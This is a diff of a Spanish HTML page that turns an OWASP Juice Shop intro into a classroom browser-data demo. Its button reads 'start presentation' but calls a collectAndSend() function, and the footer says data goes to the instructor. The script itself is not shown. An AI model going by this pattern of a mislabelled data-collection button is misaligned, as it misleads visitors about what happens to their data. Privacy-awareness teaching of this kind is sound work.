@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>Introducción a OWASP Juice Shop</title>
+  <title>Demo Ciberseguridad — ¿Qué sabe tu navegador de ti?</title>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; }
 
@@ -31,7 +31,7 @@
 
     .badge {
       display: inline-block;
-      background: #00b894; /* Ajustado al verde característico de OWASP/Juice Shop */
+      background: #ff4444;
       color: white;
       font-size: 11px;
       font-weight: 700;
@@ -161,6 +161,142 @@
     }
 
     .icon { font-size: 36px; margin-bottom: 16px; display: block; }
+
+    * { box-sizing: border-box; margin: 0; padding: 0; }
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      background: #0f0f1a;
+      color: #e0e0e0;
+      min-height: 100vh;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      justify-content: center;
+      padding: 24px 16px;
+    }
+    /* ... resto del CSS ... */
+    .card {
+      background: #1a1a2e;
+      border: 1px solid #2a2a4a;
+      border-radius: 16px;
+      padding: 32px 24px;
+      max-width: 480px;
+      width: 100%;
+      box-shadow: 0 8px 32px rgba(0,0,0,0.4);
+    }
+    .badge {
+      display: inline-block;
+      background: #00b894;
+      color: white;
+      font-size: 11px;
+      font-weight: 700;
+      letter-spacing: 1px;
+      padding: 4px 10px;
+      border-radius: 20px;
+      margin-bottom: 16px;
+      text-transform: uppercase;
+    }
+    h1 {
+      font-size: 22px;
+      font-weight: 700;
+      color: #ffffff;
+      margin-bottom: 8px;
+      line-height: 1.3;
+    }
+    .subtitle {
+      font-size: 14px;
+      color: #8888aa;
+      margin-bottom: 24px;
+      line-height: 1.6;
+    }
+    .info-list {
+      background: #0f0f1a;
+      border-radius: 10px;
+      padding: 16px;
+      margin-bottom: 24px;
+      font-size: 13px;
+      color: #aaaacc;
+      line-height: 2;
+    }
+    .info-list span {
+      color: #7c7cff;
+      font-weight: 600;
+    }
+    .consent-box {
+      background: #12122a;
+      border: 1px solid #3a3a6a;
+      border-radius: 10px;
+      padding: 14px 16px;
+      font-size: 13px;
+      color: #9999bb;
+      margin-bottom: 20px;
+      line-height: 1.6;
+    }
+    .consent-box strong { color: #ffffff; }
+    .btn {
+      width: 100%;
+      padding: 16px;
+      border: none;
+      border-radius: 12px;
+      font-size: 16px;
+      font-weight: 700;
+      cursor: pointer;
+      transition: all 0.2s;
+      letter-spacing: 0.3px;
+    }
+    .btn-primary {
+      background: linear-gradient(135deg, #7c7cff, #5555dd);
+      color: white;
+    }
+    .btn-primary:hover { opacity: 0.9; transform: translateY(-1px); }
+    .btn-primary:active { transform: translateY(0); }
+    .btn-primary:disabled { opacity: 0.5; cursor: not-allowed; transform: none; }
+    .status {
+      margin-top: 20px;
+      padding: 14px;
+      border-radius: 10px;
+      font-size: 13px;
+      text-align: center;
+      display: none;
+    }
+    .status.success {
+      background: #0d2b1a;
+      border: 1px solid #1a5c35;
+      color: #4caf82;
+      display: block;
+    }
+    .status.error {
+      background: #2b0d0d;
+      border: 1px solid #5c1a1a;
+      color: #cf6679;
+      display: block;
+    }
+    .status.loading {
+      background: #1a1a3a;
+      border: 1px solid #3a3a6a;
+      color: #8888cc;
+      display: block;
+    }
+    .data-preview {
+      margin-top: 20px;
+      background: #0f0f1a;
+      border-radius: 10px;
+      padding: 16px;
+      font-size: 12px;
+      color: #7777aa;
+      display: none;
+      word-break: break-all;
+      line-height: 1.8;
+    }
+    .data-preview.visible { display: block; }
+    .data-preview .label { color: #5555cc; font-weight: 600; }
+    .footer {
+      margin-top: 24px;
+      font-size: 11px;
+      color: #444466;
+      text-align: center;
+    }
+    .icon { font-size: 36px; margin-bottom: 16px; display: block; }
   </style>
 </head>
 <body>
@@ -194,8 +330,8 @@
     infraestructuras autorizadas.
   </div>
 
-  <button class="btn btn-primary" id="btnStart" onclick="collectAndSend()">
-    🚀 Iniciar presentación
+  <button class="btn btn-primary" id="btnShare" onclick="collectAndSend()">
+     🚀 Iniciar presentación
   </button>
 
   <div class="status" id="status"></div>
@@ -203,7 +339,7 @@
 </div>
 
 <div class="footer">
-  Recurso educativo OWASP · Solo con fines de aprendizaje · Entorno controlado
+  Demo de clase · Solo con fines educativos · Los datos se envían al instructor
 </div>
 
 <script>
